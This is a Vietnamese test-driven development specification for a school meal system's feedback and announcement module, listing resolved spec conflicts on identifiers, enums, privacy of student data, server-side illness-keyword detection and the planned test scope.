# TEST-DRIVEN DEVELOPMENT SPECIFICATION
# MF10 — Feedback & Announcement Management (Phản hồi & Thông báo)

**Document ID:** `SFMS-MF10-TDD-001`
**Version:** `1.1`
**Date:** `2026-08-02` *(v1.1: 2026-08-03)*
**Status:** `Approved` *(2026-08-03 — sau Bước 0 + Bước 1, `02_Module_Completion_Workflow.md` §7)*
**Standard:** ISO/IEC/IEEE 29119-3:2021 — Software Testing Part 3: Test Documentation
**Author:** Nguyễn Đức Mạnh (ManhNDHE160692) — Lead Backend & DB Reviewer, chủ MF10
**Reviewed by:** `[ ] Nguyễn Phương Thảo — Lead Test/QA (Pending)` · `[ ] Bùi Quang Huy — Traceability (Pending)` · `[ ] Trần Tuấn Minh — FE↔BE contract (Pending)`
**DPO Sign-off:** `[ ] Pending` — ⚠️ **module chạm PII học sinh + phụ huynh và nội dung sức khỏe** (BR-142). Đây là module duy nhất có test *khẳng định dữ liệu KHÔNG được trả về* (BR-145).
**Approved by:** `[ ] Nguyễn Văn Nam — Final Approve (Pending)`
**Classification:** `Internal — Confidential`

**References:**
- `07_implement/MF10_Feedback_Announcement_Management/TDS-MF10_Backend.md` (`SFMS-MF10-IMP-001`) — Technical Specification
- `07_implement/00_Common_Conventions.md` — **D1–D7 + D9/D10 Approved**, D8 chờ approve *(ưu tiên cao hơn ADR module — xem §2)*
- `07_implement/00_Team_Work_Assignment_Plan.md` §2a (bộ tài liệu), §2b (hợp đồng phân trang/search/filter), §7 (nghiệm thu)
- `07_implement/01_MVP_Backend_Implementation_Plan.md` §3 (stack, nền chung), §5 (Definition of Done)
- `07_implement/review.md` §A (mismatch xuyên module) + **§H (10 mismatch riêng MF10 — 6 blocker)**
- `07_implement/review_fix_plan.md` Phase 0 (D1–D7), T1.1 (mã lỗi cục bộ), **T2c dòng 144–148 (H2–H9)**, **T3.3 dòng 187 (danh sách sửa FE)**
- `02_Requirements/02_UseCases/MF10_Feedback_Announcement_Management.md` — 11 UC có spec *(traceability liệt kê 15 — xem L17)*
- `02_Requirements/03_TraceabilityMatrix/traceability_matrix.md` **§1.10** — nguồn UC↔BR↔MSG chuẩn
- `02_Requirements/00_BusinessRules/business_rules.md` §13 (BR-138…BR-145) + §14 (BR-158, BR-158b, BR-159) · `error_message.md`
- `03_Design/08_FrontEnd/Web/scripts/semantic-audit.ts` — **0 luật chạm MF10** (đã grep `feedback|announce|notification` → không kết quả; xem TDS-02 và **F7** §8.1)
- `03_Design/02_ADR/ADR-000.md` — stub SMTP (Mailpit `:8025`), `./data/uploads`, Redis tắt ở dev

> **Quy ước TDD:** Tài liệu này mô tả test cases **TRƯỚC** khi viết production code.
> Thứ tự bắt buộc: viết test (`*Test.java`) → chạy → xác nhận **FAIL 🔴** → implement → **PASS 🟢** → refactor 🔵.
> Không mark ✅ nếu `./mvnw test` chưa xanh.
> **Stack test (KHÔNG dùng Jest/Prisma — sai stack):** JUnit 5 · AssertJ · Mockito · Spring Boot Test (`@WebMvcTest`/`@SpringBootTest`) · **Testcontainers PostgreSQL 16** · Flyway · Mailpit (BR-159) · RestAssured (tùy chọn nhóm INT).
> **Test data:** SYNTHETIC, seed từ `mock-data.ts` (`FEEDBACKS`, `ANNOUNCEMENTS`, `NOTIFICATIONS`, `ILLNESS_KEYWORDS`) → `V{n}__seed_mf10.sql`. **Không dùng PII thật.** Nội dung phản hồi test dùng câu tổng hợp, không copy phản hồi thật của phụ huynh.

---

## CHANGELOG

> **Policy 4.4 — Immutable History:** Không bao giờ xóa thông tin cũ.

| Ngày | Người thực hiện | Nội dung thay đổi |
|------|-----------------|-------------------|
| 2026-08-02 | Nguyễn Đức Mạnh | Khởi tạo — TDD spec cho MF10 (15 UC, 11 BR, 8 MSG). **17 Logic Issue (L1–L17)** encode hành vi đã sửa theo `00_Common_Conventions.md` D1–D10 + `review.md` §H, **không** theo bản TDS-MF10 v1.0 ở những điểm bị ghi đè — nặng nhất là **L4 (`NotificationType` 4 giá trị → 7)**. **52 test case**: 24 unit · 10 security · 18 integration. `semantic-audit.ts` không có luật nào chạm MF10 → oracle lấy trực tiếp từ BR/UC/MSG (xem TDS-02). |
| 2026-08-03 | Nguyễn Đức Mạnh | **Bước 1 (`02_Module_Completion_Workflow.md` §7 việc 3) — Status `Draft` → `Approved`.** Thêm **`L18`–`L21`** encode 4 quyết định mới của `TDS-MF10` v1.1 mà 52 TC cũ **không** phủ: `M10-D06` (bỏ `MealServingPort` → `ReferenceResolver`), `M10-D11` (`feedback_attachments` — đóng **F2**, cấp contract cho `TC-SEC-009` vốn đang treo), `M10-D12` (khuôn mã đổi `FB-8809` → **`FB-2026-8809`**), `M10-D13`/`M10-D14` (D11/D12). Thêm **2 test case bắt buộc** mà cả 13 TestSpec đều thiếu vì viết TRƯỚC khi D11–D13 tồn tại: **`MF10-TC-CON-001`** (D11 — `oneOf`, `grep -n "oneOf" TestSpec-MF10` trước đó ra **0 kết quả thật**, chỉ khớp `ZoneOffset`) và **`MF10-TC-CON-002`** (D12 — bẫy Jackson "200 mà không lưu gì"). **D13 ✅ không cần TC riêng** — đã kiểm `V900__test_fixtures.sql`: cả 5 vai trong `@PreAuthorize` của MF10 (`parent`/`teacher`/`school-admin`/`service-caterers`/`medical-staff`) đều có tài khoản `ACTIVE`, nên `TC-SEC-001`/`SEC-003` dùng **tài khoản seed thật** thay `@WithMockUser` (chúng phụ thuộc claim `schoolId`). Tổng: **54 test case** (24 unit · 10 security · 18 integration · **2 contract**). Package `com.sfms.feedback`+`announcement`+`notification` → **`com.sfms.mf10`** (`M10-D03`). |

---

## MỤC LỤC

1. [Thông tin Module](#1-thông-tin-module) · 2. [Logic Issues Resolved](#2-logic-issues-resolved) · 3. [Test Design Specification](#3-test-design-specification-tds) · 4. [Test Case Specification](#4-test-case-specification) · 5. [Red-Green-Refactor Tracker](#5-red-green-refactor-tracker) · 6. [Entry / Exit Criteria](#6-entry--exit-criteria) · 7. [Rollback Plan](#7-rollback-plan) · 8. [CASE 2.0 Anti-Pattern Detection](#8-case-20-anti-pattern-detection-ai-assisted-tcs)

---

## 1. Thông tin Module

| Field | Value |
|-------|-------|
| **Feature / Gap ID** | `MF10` — Feedback & Announcement Management (**15 UC** theo traceability §1.10) |
| **Module** | 🔴 **`com.sfms.mf10`** *(`M10-D03` / §0-BIS — bản v1.0 ghi `com.sfms.feedback` + `com.sfms.announcement` + `com.sfms.notification`, ba package cho **một** bounded context)* — Bounded Context: **Communication & Feedback** |
| **Spec gốc** | `SFMS-MF10-IMP-001` (TDS-MF10_Backend.md) + `00_Common_Conventions.md` D1–D10 |
| **Priority** | 🟡 **P2** (`00_Team_Work_Assignment_Plan.md` §3) — nhưng `NotificationPort` là **hạ tầng dùng chung**: MF05/MF06/MF07/MF11 đều phát thông báo qua nó, nên phần notification phải xong sớm hơn thứ tự P2 gợi ý |
| **Sprint** | Tuần 4–5 theo `01_MVP_Backend_Implementation_Plan.md` §4 (đợt P2 song song: Mạnh MF10 · Thảo MF07+MF12 · Nam MF13) |
| **Milestone** | Cổng cuối Tuần 5 — *"52 resource CRUD qua Swagger khớp hợp đồng mock; RBAC 7 role áp đúng"* |
| **Data Classification** | **`Confidential` — có PII trực tiếp.** Phản hồi gắn `studentId` + tên học sinh + lớp, nội dung có thể chứa **dữ liệu sức khỏe** ("con đau bụng", "nôn"). BR-145 buộc ẩn danh khi tổng hợp → đây là module **duy nhất** trong 13 module có test khẳng định *"field này KHÔNG được xuất hiện trong response"* |
| **Compliance Scope** | **PDPD** (dữ liệu sức khỏe trẻ em) — theo ADR-000. Không có căn cứ pháp lý chuyên ngành riêng như MF07/MF08; oracle của module này **hoàn toàn** là BR/UC/MSG nội bộ |
| **Upstream Dependencies** | **MF01** (JWT `AuthUser{userId, fullName, role, schoolId}`; `common/domain/BaseEntity` D9; `common/storage/StorageService` D10; `common/enums/` D6) · **MF02** (`schoolId`, `classroomId`) · **MF03** (`ParentChildPort` — phụ huynh chỉ phản hồi cho **con mình**) · **MF05** (`dishId`) · **MF09** (`MealServingPort.findServedAt()` — **mốc duy nhất** tính cửa sổ 24h BR-139) |
| **Downstream Consumers** | **MF11** (phản hồi `illnessKeyword=true` là đầu mối nghi vấn sự cố — BR-142) · **MF13** (thống kê hài lòng theo tuần — BR-141) · **MF05/MF06/MF07/MF11** (đều gọi `NotificationPort.publish()` — ADR-M10-4) |

### 1.1 AI Generation Context (CASE 2.0)

| Field | Value |
|-------|-------|
| **AI Assisted?** | `Yes` |
| **Constraint Source** | `TDS-MF10_Backend.md` §17.1 (C1–C9) + §10 (bảng mã lỗi `FBA-`) + §16 (auth matrix) + §2.3 (CF-M10-1…11); `00_Common_Conventions.md` D1–D10; `review.md` §H (H1–H10); `00_Team_Work_Assignment_Plan.md` §2b |
| **Constraints Injected** | C1 PagedResponse 5 field + `SEARCH_FIELDS` cố định · C2 JWT-first + chủ sở hữu · C3 BR-139 cửa sổ 24h từ `servedAt` (MF09) · C4 BR-140 tag bắt buộc <3 sao · C5 BR-142 dò từ khóa server-side + MSG-057/058 · C6 BR-144 revision append-only · C7 BR-145 hai DTO ẩn danh · C8 BR-138/158/158b/159 qua `NotificationPort` · C9 `audienceCodes` lọc / `audienceLabel` hiển thị; **cộng thêm** D1 (id = mã nghiệp vụ), D2 (envelope), D4 (ISO-8601), D5 (client-supplied id), **D6 (`NotificationType` 7 giá trị — GHI ĐÈ TDS)**, D7 (message tiếng Anh), D9 (BaseEntity), D10 (StorageService) |
| **Model** | `claude-opus-5` (theo `00_Team_Work_Assignment_Plan.md` §2c-4: TestSpec dùng Opus vì oracle phải khớp BR/MSG) |
| **Trust Level** | `T2 → T3 (pending Red Gate §5.1)` |

> **Oracle policy (Team Plan §2a):** *"mọi expected value PHẢI trích từ BR/UC/MSG — không dùng giả định AI."* Mỗi test case có trường **Oracle Source** trỏ đúng mã BR/UC/MSG/D-decision. Test nào không trỏ được nguồn → **không viết**, ghi vào §8.1 thay vì bịa kỳ vọng.
>
> ⚠️ **Riêng MF10 không có `semantic-audit.ts` làm lưới an toàn thứ hai** (0/54 luật chạm module này) và **không có căn cứ pháp lý chuyên ngành** như QĐ 1246 của MF08. Toàn bộ oracle đứng trên 11 BR — nên bảng TDS-03b (phủ UC↔BR) là chốt kiểm duy nhất, phải soi kỹ hơn các module khác.

---

## 2. Logic Issues Resolved

> **Bắt buộc điền trước khi viết test.** Test encode hành vi **đã sửa**, không phải hành vi trong spec gốc.
> Nguồn sai lệch: `00_Common_Conventions.md` (thứ tự ưu tiên: **file quy ước chung > ADR module trong TDS §3 > hợp đồng mock FE**) và `review.md` §H.
> ⚠️ **L1–L8 là chỗ TDS-MF10 v1.0 bị GHI ĐÈ; L9–L15 là chỗ mock FE sai còn TDS đúng; L16–L17 là lệch ở nguồn yêu cầu.** Ai đọc TDS hoặc đọc mock mà bỏ qua bảng này sẽ viết test sai hợp đồng.

| # | Spec gốc (sai / thiếu) | Thực tế (quy ước / BR / policy đã chốt) | Fix áp dụng trong test |
|---|------------------------|------------------------------------------|------------------------|
| **L1** | TDS §5.2: `feedbacks`/`announcements`/`notifications` đều `id UUID PRIMARY KEY`, **không** có cột `code` — nhưng §9.2 lại trả `"id": "FB-8809"`, `"id": "ANN-113"`, `"id": "FBR-001"`. `review.md` A1 xếp MF10 vào nhóm **blocker** *"id UUID nhưng ví dụ JSON trả mã nghiệp vụ"* | **D1 (Approved 30/07):** `id` công khai **= mã nghiệp vụ** (`code`); path param dùng `code`; FK trong JSON dùng `code` của bảng đích; UUID chỉ là PK nội bộ, **không lộ ra API**. D1 §"Việc phải làm": *"MF10 — §5.2 thêm `code VARCHAR(32)` + `UNIQUE(school_id, code)`; thêm `@JsonProperty("id")`"* | Mọi test gọi `GET /api/v1/feedbacks/FB-8809`, `PATCH /api/v1/announcements/ANN-112` (**không** UUID). Assert `response.id == "FB-8809"`, `feedbackId == "FB-8809"`, `dishId == "DISH-018"`. **`MF10-TC-INT-009`** khóa chặn: không JSON nào có UUID ở field `id`/`*Id`. |
| **L2** | TDS §5.2 khai cột `critical BOOLEAN` và enum `NotificationType { ALLERGY, FOOD_SAFETY, NEWS, SYSTEM }`; §9.2 `GET /notifications` ghi *"item khớp shape mock"* (4 giá trị) nhưng `notification-preferences/me` lại dùng **7 khóa** `MENU_PUBLISHED…ALLERGY_ALERT`. `review.md` H5 = **blocker**: *"Không thể bật/tắt theo loại nếu 2 bảng khóa khác nhau"* | **D6 chốt `NotificationType` = 7 giá trị**: `MENU_PUBLISHED`, `INSPECTION_ALERT`, `CAPA_ASSIGNED`, `EXPIRY_ALERT`, `INCIDENT_ALERT`, `FOOD_RECALL`, `ALLERGY_ALERT`. Bộ 4 giá trị (`ALLERGY/FOOD_SAFETY/NEWS/SYSTEM`) **bị loại bỏ khỏi hợp đồng API** | ⭐ **Thay đổi lớn nhất của TestSpec này.** `MF10-TC-018` assert enum chỉ nhận 7 giá trị và **từ chối** `"FOOD_SAFETY"`/`"NEWS"`/`"SYSTEM"`. Hệ quả: `critical` **không còn là cột** mà **dẫn xuất** từ `type ∈ {INCIDENT_ALERT, FOOD_RECALL, ALLERGY_ALERT}` (đúng 3 loại mock đánh dấu CRITICAL) — `MF10-TC-INT-015` assert không có cột `critical`. ⚠️ Ánh xạ 7 loại → 4 màu badge của FE **chưa ai định nghĩa** → **F1** (§8.1), không tự bịa trong test. |
| **L3** | TDS §5.2/§9.2 dùng nhãn vai trò kiểu BR-007 trong `recipientRoles`: `"Medical Staff"`, `"School Administration"`, `"Service Caterers"` | **D6 chốt `RoleKey` = kebab-case** (`system-admin`, `school-admin`, `medical-staff`, `service-caterers`, `teacher`, `parent`, `supplier`) — *"chính là segment URL, nên chốt kebab-case"*. `review.md` H6 = **blocker** | `MF10-TC-020` assert `recipientRoles = ["medical-staff","school-admin"]`, **từ chối** `"Medical Staff"`. ⚠️ D6 ghi rõ FE **không có key cho `"Raw Food Supplier"`** → chốt `supplier`; test dùng đúng `supplier` cho vai NCC. |
| **L4** | TDS §5.2 `Feedback.mealType` là enum riêng `{BREAKFAST, LUNCH, SNACK}` khai **trong module** | **D6:** `MealType` ở **`common/enums/`**, SCREAMING_SNAKE trong JSON và DB; nhãn tiếng Việt ở FE `lib/labels.ts`. D6 ghi rõ **"Bữa phụ" (SNACK) ≠ "Bữa chiều"** | `MF10-TC-019` assert serialize `"LUNCH"`, **từ chối** payload `"Bữa trưa"` (chính là thứ mock đang gửi — `parent/feedback/meal/page.tsx:91`). Module **không** tự khai lại enum → nếu `common/enums/MealType` chưa có thì test 🔴, **không** khai tạm (§6 Suspension). |
| **L5** | TDS §10: 5 mã cục bộ `FBA-140`, `FBA-REQ`, `FBA-DUP`, `FBA-STATE`, `FBA-404` — không tồn tại trong `error_message.md`. `review.md` A-dòng-27 + `review_fix_plan.md` T1.1 liệt kê đúng 5 mã này | **D7:** backend trả `code` + `message` **tiếng Anh** nguyên văn `error_message.md`; mã dẫn xuất BR sẽ được cấp **MSG-104+** (T1.1). FE tra `lib/messages.ts` map `code` → nhãn tiếng Việt | Test assert theo **`code`** (`FBA-140`), **không** assert chuỗi hiển thị. `MF10-TC-INT-010` assert `message` là tiếng Anh (regex không chứa ký tự tiếng Việt có dấu). Khi Huy cấp MSG chính thức → đổi bảng ánh xạ, **không** viết lại test. |
| **L6** | TDS §10 dùng envelope `{ "error": { "code", "message" } }`; một số ví dụ §9.2 có `details`, một số không | **D2:** `{ "error": { "code", "message", "details" } }`; `details` là **mảng, có thể rỗng, KHÔNG bao giờ `null`** | `MF10-TC-INT-010` assert đủ 3 field trên mọi mã lỗi MF10; `details` là array kể cả khi rỗng. |
| **L7** | TDS §9.1 ghi *"path thật thêm tiền tố `/api/v1`"* | **D3:** chốt `baseURL = "/api/v1"` | Mọi URL trong test dùng `/api/v1/...`. |
| **L8** | TDS §9 **không** ghi câu bắt buộc của D10; TDS bỏ sót hẳn luồng **đính kèm file** dù mock có: `parent/feedback/quality/page.tsx` có state `fileName` + icon `Paperclip` (file chọn xong **không đi đâu cả**) | **D10 (Approved 31/07)** nêu đích danh *"**MF10** ảnh đính kèm phản ánh"* trong danh sách module phải dùng `common/storage/StorageService`, **không** tự viết I/O | Bổ sung `feedback_attachments` + `MF10-TC-SEC-009` (upload qua `StorageService`, whitelist loại/kích thước, kiểm magic bytes). Ghi **F2** (§8.1): TDS §5.2/§9 của Mạnh phải bổ sung bảng + endpoint này. |
| **L9** | **Mock FE tính `illnessKeyword` ở client**: `hasIllnessKeyword()` với danh sách 10 từ khóa **hardcode trong `mock-data.ts:2716`**, rồi **gửi kết quả lên payload**, sau đó **tự gọi `notify()`** tới `["medical-staff","school-admin"]` (`feedback/meal/page.tsx:98-111`). `review.md` H3 = **blocker**: *"sửa payload là tắt được cảnh báo y tế"* | TDS ADR-M10-6 + `review_fix_plan.md` H3: backend **tính lại**, **bỏ qua** giá trị client gửi; danh sách từ khóa ở bảng `illness_keywords` (unaccent + lower); notify Medical Staff (MSG-058/BR-142) **chuyển hẳn về server** | ⭐ `MF10-TC-006` gửi `illnessKeyword=false` kèm comment *"con đau bụng"* → assert DB lưu **`true`** và notification vẫn phát. Cùng lớp lỗi với MF07 CF-16/CF-26. |
| **L10** | **Mock FE gửi payload thiếu khóa liên kết**: `{ id (client sinh), studentId, student, class, date, mealType (**tiếng Việt**), dish (**tên món**, không phải `dishId`), rating, tags, comment, submittedAt, illnessKeyword }`. **Không có** `mealSessionId`, `scope`, `dishId`, `portionSize`. `review.md` H4 = **blocker** | TDS §9.2 + ADR-M10-1: `mealSessionId` **bắt buộc** — thiếu nó thì **BR-139 không tính được ở server** (hiện gate chỉ ở client qua `MEAL_HISTORY.feedbackOpen` cứng trong seed); thiếu `dishId` thì không truy xuất món khi điều tra sự cố (BR-142 → MF11) | `MF10-TC-001`/`TC-002` gọi API **trực tiếp** (không qua FE) → chứng minh gate BR-139 chạy ở **server**. `MF10-TC-INT-015` assert schema **có** `meal_session_id NOT NULL`, `dish_id`, `scope`, `portion_size`. Thiếu `mealSessionId` → **422 `FBA-REQ`**. |
| **L11** | **Mock FE nhận bản ghi phản hồi đầy đủ ở mọi vai**: `interface Feedback` khai `studentId: string` và `student: string` **bắt buộc** (không optional); màn `school-admin/feedback` đọc nguyên bản ghi. `review.md` H2 = **blocker** `[TDS ghi nhận CF-M10-9]` | **BR-145** + ADR-M10-5. `review_fix_plan.md` H2 kết luận: *"**BR-145 rõ ràng → TDS đúng, FE vi phạm quyền riêng tư**"* → tách `FeedbackListItem` (ẩn danh) ↔ `FeedbackDetail` (chủ sở hữu); 2 field thành optional ở FE | `MF10-TC-008` (mapper không mang danh tính), `MF10-TC-SEC-002`/`INT-007` (School Admin + Caterers không thấy `studentId`/`student` ở mọi endpoint kể cả dashboard). Ngoại lệ **duy nhất**: Medical Staff + `illnessKeyword=true` + **ghi audit** (`MF10-TC-009`). |
| **L12** | **Mock FE không có `audienceCodes`**: `Announcement.audience` là **chuỗi tự do** (`"Phụ huynh khối 3"`, `"Toàn trường"`); màn create ghép nhiều nhóm bằng `join(", ")`, màn edit lại dùng `<Select>` **một giá trị** với tập tùy chọn **khác** tập của màn create; `mock-server.ts:147` mặc định `body.audience ?? "Toàn trường"`. `review.md` H7 = **blocker** | TDS C9 + `review_fix_plan.md` H5/H6/H7: **giữ `audienceCodes`** — *"không có nó thì **mọi vai thấy mọi thông báo**"*. `audience_codes JSONB` để lọc, `audience_label` để hiển thị | `MF10-TC-024` (lọc theo mã, hiển thị theo nhãn), `MF10-TC-SEC-004` (Parent khối 3 **không** thấy thông báo gửi riêng Giáo viên). Test **không** phụ thuộc FE đã sửa hay chưa. |
| **L13** | **Mock FE trả nguyên `revisions[]` cho mọi vai** ở cả list lẫn detail. `review.md` H9 = minor `[TDS ghi nhận CF-M10-6]` | `review_fix_plan.md` H9: *"Backend đúng (BR-144 + phân quyền)"* → **list** trả `revisionCount`; **`revisions[]` chỉ ở detail và chỉ cho School Administration** | `MF10-TC-SEC-005` assert Parent/Teacher/Caterer nhận detail **không có** `revisions`, School Admin **có**; list mọi vai chỉ có `revisionCount`. |
| **L14** | **Mock FE gửi ngày dạng chuỗi Việt**: `submittedAt: new Date().toLocaleString("vi-VN")` (`feedback/meal/page.tsx:96`), `publishedAt` = `todayStamp()` = `"29/07/2026"`, và **DRAFT → chuỗi rỗng `""`** thay vì `null` (`mock-server.ts:148`). `review.md` A4 + H8 | **D4:** JSON **luôn ISO-8601** — ngày `"2026-07-01"` (`LocalDate`), ngày giờ `"2026-07-01T13:15:00Z"` (`Instant`). `review.md` H8: *"nên thống nhất `null`"* | `MF10-TC-021` assert regex `\d{2}/\d{2}/\d{4}` **không** xuất hiện trong bất kỳ response nào của MF10; `submittedAt` do **server** đặt (bỏ qua giá trị client); `MF10-TC-013` assert `publishedAt` là **`null`** khi DRAFT, không phải `""`. |
| **L15** | TDS im lặng về việc client tự sinh `id` | **D5** áp cho cả 13 module: body có `id` → dùng làm `code`, trùng → **409**; vắng → server sinh theo `code_sequences`; **luôn** trả `id` trong 201. ⚠️ D5 nêu đích danh **`FB-${Date.now()}`** là 1 trong 6 resource FE đang tự sinh id | `MF10-TC-INT-011` phủ 2 nhánh. Mock `feedback/meal/page.tsx:86` dùng `` `FB-${String(Date.now()).slice(-6)}` `` → nhánh "client gửi id" là **luồng thật**, không phải giả định. |
| **L16** | TDS §5.2 khai `announcements.author_user_id` + `announcement_revisions.revised_by_user_id` + `feedback_responses.responder_user_id` | **D9:** `created_by`/`updated_by` là **tên cột reserved** cho `BaseEntity` (`VARCHAR(180)`, email actor, `AuditorAware` tự điền). Field nghiệp vụ "ai làm" phải đặt tên khác theo khuôn `<hành_động>_by_<loại>_id` | ✅ **MF10 đã đúng khuôn D9** (3 cột trên đều là `*_by_*_id`) — không phải sửa. `MF10-TC-INT-017` assert: entity `extends BaseEntity`, service **không** set `createdBy` tay, và `created_by` ≠ `author_user_id` (hai field khác nghĩa, cùng tồn tại). |
| **L17** | Kế hoạch §3 ghi MF10 = **"7 UC"**; UC file có **11** bảng UC; traceability §1.10 liệt kê **15** | Traceability §1.10 là **nguồn chuẩn duy nhất** (Team Plan §2c). 4 UC chỉ có ở traceability, **thiếu UC spec**: UC-126, UC-088, UC-058, UC-136 (TDS ghi nhận CF-M10-2) | TDS-03b phủ đủ **15 UC**. 4 UC thiếu spec được thiết kế test theo **BR-138/158/158b/159 + mock**, ghi rõ ở cột "Nguồn hành vi" để Huy đối chiếu — **không** bịa Normal Flow. |
| **L18** 🔴 | TDS-MF10 v1.0 §8.1 khai **`MealServingPort`** (*"MF10 khai — MF09 hiện thực"*) và §11.1 ghi *"nếu MF09 chưa xong: dùng adapter tạm"* | **`M10-D06`** (Bước 0, 03/08): **MF09 ĐÃ MERGE** (`V16`/`V17`) và hai phương thức của port là **tra cứu thuần** ⇒ `common/reference/ReferenceResolver.servedAtOf(distributionId)` / `servedMealsWithin(studentId, window)`. Luật §7 câu 6: *"tra cứu thuần → THÊM DÒNG vào ReferenceResolver, KHÔNG khai Port"* (tiền lệ `M08-D08`, `M09-D08`) | `MF10-TC-001`/`TC-002`/`TC-INT-002` **không** mock `MealServingPort` nữa — stub `ReferenceResolver` với `FX-001` (đồng hồ cố định). **Không** viết adapter tạm: MF09 có thật, seed `V19` trỏ `student_distributions` thật. `mealSessionId` chính là `student_distributions.id`, và JSON nhận **`code`** của nó (`DSTU-0706A-001`, D1). |
| **L19** 🔴 | TDS-MF10 v1.0 **không có** bảng/endpoint đính kèm file ⇒ **`MF10-TC-SEC-009` viết ra mà không có contract để test** (chính **F8**… đúng hơn là **F2** của §8.1) | **`M10-D11`** (Bước 1, 03/08) đóng **F2**: bảng `feedback_attachments` + `POST /feedbacks/{code}/attachments` (multipart qua `common/storage/StorageService`) + `GET …/attachments/{attachmentCode}` (tải xuống có `@PreAuthorize` + audit). **D10-BIS**: phân loại **riêng tư** ⇒ lưu `storageKey`, JSON trả **`id` tài liệu**, **không** URL, **không** presign | `MF10-TC-SEC-009` nay **chạy được**: assert (a) whitelist 4 loại, (b) ≤ 5 MB → 413 `FBA-SIZE`, (c) đổi đuôi `.jpg` cho file `.exe` → **magic bytes** không khớp → 415 `FBA-MEDIA`, (d) JSON **không** chứa `storageKey` và **không** chứa URL, (e) Service Caterers gọi endpoint tải xuống → **403** *(họ đọc phản hồi ẩn danh; ảnh có thể lộ danh tính — BR-145)*. |
| **L20** 🔴 | Mọi TC hiện dùng mã `FB-8809`, `ANN-113`, `FBR-001`, `NTF-482913` (khuôn của TDS v1.0 và của mock) | **`M10-D12`** (C1): mã sinh qua `codeGenerator.next("mf10_<resource>:" + Year.now().getValue(), "<PREFIX>")` ⇒ khuôn **`<PREFIX>-<năm>-<số>`**: `FB-2026-8809`, `ANN-2026-113`, `FBR-2026-001`, `NTF-2026-482913`. Bảng `code_sequences` thật là **counter phẳng theo `scope`** (`V1:31`), **không** có `school_id`/`year` — nhét năm vào chính chuỗi `scope` là lời giải MF03 đang chạy | Test **assert khuôn bằng regex** `^FB-\d{4}-\d+$` chứ **không** so chuỗi cứng, để đổi năm không làm đỏ. `MF10-TC-INT-011` (D5) gửi `{"id": "FB-2026-9999"}` → dùng làm `code`; gửi lại lần hai → **409 `FBA-409`/MSG-139**. ⚠️ Mock `feedback/meal/page.tsx:86` sinh `` `FB-${String(Date.now()).slice(-6)}` `` — **không** khớp khuôn mới ⇒ **Minh** sửa, nhưng test **không** phụ thuộc FE đã sửa hay chưa. |
| **L21** 🔴 | Cả 52 TC của v1.0 **không TC nào** phủ **D11** (`oneOf` theo vai) và **D12** (Read DTO ≠ Write DTO). `grep -n "oneOf" TestSpec-MF10` ra **0 kết quả thật** — hit duy nhất là `ZoneOffset` khớp nhầm | **D11/D12** (`02_Module_Completion_Workflow.md` §6) ra đời **SAU** khi 13 TestSpec đã viết ⇒ **0/13 bộ nào phủ**. `M10-D13` khai `oneOf` cho `GET /feedbacks` + `GET /announcements`; `M10-D14` liệt kê field dẫn xuất và sửa 2 cặp Request/Response lệch (`dish`/`dishId`, `audience`/`audienceCodes`) | **2 TC MỚI**: **`MF10-TC-CON-001`** (D11) và **`MF10-TC-CON-002`** (D12) — xem §4 nhóm **CONTRACT TEST CASES**. Đây là **hai lớp lỗi rẻ nhất để bắt, đắt nhất khi bỏ sót**: D11 tốn hai phiên curl ở MF03, D12 làm form báo "thành công" mà DB không đổi. |

> **Ghi chú cho reviewer:** 11 mâu thuẫn **CF-M10-1…11** trong TDS §2.3 **vẫn còn hiệu lực** (D1–D10 không gỡ được vì chúng là mâu thuẫn giữa UC file / traceability / BR / mock, không phải giữa các TDS). Bốn cái ảnh hưởng trực tiếp tới test:
> - **CF-M10-1 (MSG-071/072/074 là mã của module Menu):** TestSpec **không** dùng ba mã này; announcement dùng **MSG-047** (công bố) / **MSG-029** (cập nhật) theo traceability. Trạng thái "lưu nháp" **không có MSG** → `MF10-TC-013` assert theo HTTP 201 + `status=DRAFT`, **không** assert mã MSG nào. Xem **F3** (§8.1).
> - **CF-M10-3 (BR lệch giữa UC file và traceability):** BR-140 chỉ áp cho **Parent** (traceability UC-086 của Teacher chỉ có BR-139) → `MF10-TC-004` khóa chặn hành vi này. Ai "sửa cho nhất quán" bằng cách ép Teacher chọn tag sẽ làm đỏ test.
> - **CF-M10-2 (4 UC thiếu spec):** xem L17.
> - **CF-M10-11 (`feedbackOpen` cứng trong seed):** không test nào được đọc `MEAL_HISTORY.feedbackOpen`; cửa sổ 24h luôn tính từ `servedAt` qua `MealServingPort` (`FX-001` đồng hồ cố định).

---

## 3. Test Design Specification (TDS)

### TDS-01 — Scope / Phạm vi

```
MF10 — các layer được kiểm thử:
├── Domain          FeedbackWindowPolicy (BR-139), QualityTagRule (BR-140),          → unit, không deps
│                   IllnessKeywordDetector (BR-142), QuietHoursPolicy (BR-158/158b),
│                   AnnouncementStatus FSM, RetryBackoffPolicy (BR-159)
├── Service         FeedbackService, FeedbackResponseService, FeedbackDashboardService, → unit (Mockito)
│                   AnnouncementService, NotificationService, NotificationDispatcher,
│                   WeeklyFeedbackDigestJob, DeliveryRetryScheduler
├── Web/Controller  FeedbackController, AnnouncementController,                       → @WebMvcTest (mock service)
│                   NotificationController, NotificationPreferenceController
├── Mapper          FeedbackListItemMapper (ẩn danh) ↔ FeedbackDetailMapper (chủ sở hữu) → unit ⭐ BR-145
├── Repository/Spec FeedbackSpec, AnnouncementSpec (SEARCH_FIELDS + dateFrom/dateTo)   → @DataJpaTest + Testcontainers
├── Integration     API → DB → event, Flyway thật, CHECK constraint, RULE append-only  → @SpringBootTest + Testcontainers PG16
└── Contract        /v3/api-docs (D8 — chỉ chạy khi Nam approve D8)                    → @SpringBootTest

NGOÀI phạm vi (thuộc module khác, chỉ mock qua port):
  - ReferenceResolver / MF09  → servedAtOf(distributionId) (BR-139) — M10-D06, KHONG con la Port;
                                 MF09 da merge V16, stub bang lop tra ve Instant/empty
  - ParentChildPort   / MF03  → phụ huynh ↔ học sinh (kiểm quyền §4.3 TDS); stub
  - StorageService    / common→ mock, assert có gọi (D10/L8)
  - PushGateway       / ADR-000 stub → assert số lần gọi + thất bại giả lập (BR-159)
  - MailSender        / Mailpit :8025 → assert email fallback thật ở nhóm INT
  - Badge màu/nhãn tiếng Việt của notification → FE (lib/labels.ts), backend chỉ trả enum D6
```

### TDS-02 — Test Basis / Cơ sở Kiểm thử

| Source | Items Derived |
|--------|--------------|
